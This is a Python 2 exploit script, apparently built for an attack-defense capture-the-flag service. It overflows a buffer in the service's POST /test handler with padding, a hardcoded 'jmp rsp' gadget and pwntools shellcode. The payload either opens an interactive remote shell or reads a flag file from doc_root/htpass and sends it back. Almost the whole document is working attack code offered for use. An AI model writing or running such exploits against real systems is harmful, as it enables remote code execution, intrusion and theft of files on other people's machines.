#!/usr/bin/env python

import socket
import sys
import os
import random
import string
import time
from struct import pack
from pwn import asm, context, shellcraft
from hashlib import sha1
from base64 import urlsafe_b64encode as b64enc

_USER_ = ''.join(random.choice(string.ascii_letters) for i in range(32))
_PASS_ = ''.join(random.choice(string.ascii_letters) for i in range(32))

def usage():
    print "Usage: %s <command> <ip> <port> [<flag_id>]" % os.path.basename(__file__)
    print "\tCommands:"
    print "\t\tshell        Open a shell"
    print "\t\tretrieve     Retrieve the flag, require the <flag_id>"
    print "\t\thelp         Show this message"

def readfile(path, dst='rdi'):
    """this function comes from pwntools itself"""
    craft = shellcraft.amd64

    ret = craft.mov('r8', dst)
    ret += craft.pushstr(path)
    ret += craft.syscall('SYS_open', 'rsp', 'O_RDONLY')
    ret += craft.mov('rbx', 'rax')
    ret += craft.syscall('SYS_fstat', 'rax', 'rsp')
    ret += 'add rsp, 48\n'
    ret += 'mov rdx, [rsp]\n'
    ret += craft.syscall('SYS_sendfile', 'r8', 'rbx', 0, 'rdx')
    return ret

def get_payload(flag_id, shell):
    # Create the payload
    context.arch = 'amd64'
    craft = shellcraft.amd64

    rop = pack('<Q', 0x00000000004027d9)   # jmp rsp ; ret
    if shell:
        shellcode = craft.linux.sh()
    else:
        shellcode = 'sub rsp, 255\n' # To handle struct stat
        shellcode += readfile( 
                "doc_root/htpass/%s" % b64enc(sha1(flag_id).digest()),
                1
                )                       # send the file to stdout
        shellcode += craft.linux.syscall('SYS_exit', 0)

    rop += asm(shellcode)

    for c in ['&', '\r', '\n']:
        if c in rop:
            print "Found %x in the shellcode" % ord(c)
            sys.exit(2)

    payload = "POST /test HTTP/1.0\r\n\r\nusername=%s&secret=%s&pass=%s\r\n"% \
            (_USER_, "A"*0xb8 + rop, _PASS_)
    return payload


def exploit(ip, port, flag_id, shell):
    payload = get_payload(flag_id, shell)

    # Send the payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((ip, port))

    sock.settimeout(0.3)
    sock.sendall(payload)
    time.sleep(0.1)

    # Exploit the result: shell or read flag
    if shell:
        buf = ''
        while buf != 'exit':
            buf = raw_input('$ ')
            sock.sendall("%s\n" % buf)
            time.sleep(0.1)
            try:
                print sock.recv(8192),
            except socket.timeout:
                pass
    else:
        try:
            f = sock.recv(8192)
            print f.splitlines()[-1]
        except socket.timeout:
            pass


if __name__ == '__main__':
    # parse options
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == 'help':
        usage()
        sys.exit(0)
    elif cmd == 'shell' and len(sys.argv) >= 4:
        pass
    elif cmd == 'retrieve' and len(sys.argv) >= 5:
        flag_id = sys.argv[4]
    else:
        usage()
        sys.exit(1)

    ip = sys.argv[2]
    port = int(sys.argv[3])

    if cmd == 'shell':
        exploit(ip, port, '', True)
    elif cmd == 'retrieve':
        exploit(ip, port, flag_id, False)
